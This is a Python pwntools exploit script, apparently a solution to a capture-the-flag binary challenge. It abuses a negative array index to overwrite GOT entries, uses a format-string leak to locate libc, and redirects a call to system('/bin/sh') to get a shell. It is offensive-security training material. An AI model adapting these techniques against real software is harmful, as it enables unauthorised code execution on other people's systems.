from pwn import *

elf = ELF("./chall")
#libc = ELF("../../libs/x86_64/2.27/libc.so.6.cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

script = '\n'.join(
        [
#            "break readlong",
#            "break *main + 92",
#            "break *main + 122",
#            "break *readlong + 61",
#            "break *0x400767",
            "break *0x400797",
            "continue",
        ]
)

#p = gdb.debug(elf.path,gdbscript = script)
p = process(elf.path)

# buffer = elf.got['atol']
print(p.recvuntil("index: "))
p.sendline("-2")
print(p.recvuntil("value: "))
p.sendline(str(elf.got['malloc']))


# elf.got['atol'] = elf.plt['printf']
print(p.recvuntil("index: "))
buf = b"AA%25$8p"
buf += p64(elf.plt['printf'])
p.send(buf)

# leak  __libc_start_main+243  address
p.recvuntil("AA")
addr___libc_start_main = int(p.recv(14).decode(),16) - 243

# calc system address
log.info("addr___libc_start_main = " + hex(addr___libc_start_main))
addr_libc_base = addr___libc_start_main - libc.symbols['__libc_start_main']
log.info("addr_libc_base = " + hex(addr_libc_base))
addr_system = addr_libc_base + libc.symbols['system']
log.info("addr_system = " + hex(addr_system))

# elf.got['atol'] = system
# system("/bin/sh\x00")
print(p.recvuntil("value: "))
buf = b"/bin/sh\x00"
buf += p64(addr_system)
p.send(buf)


p.interactive()
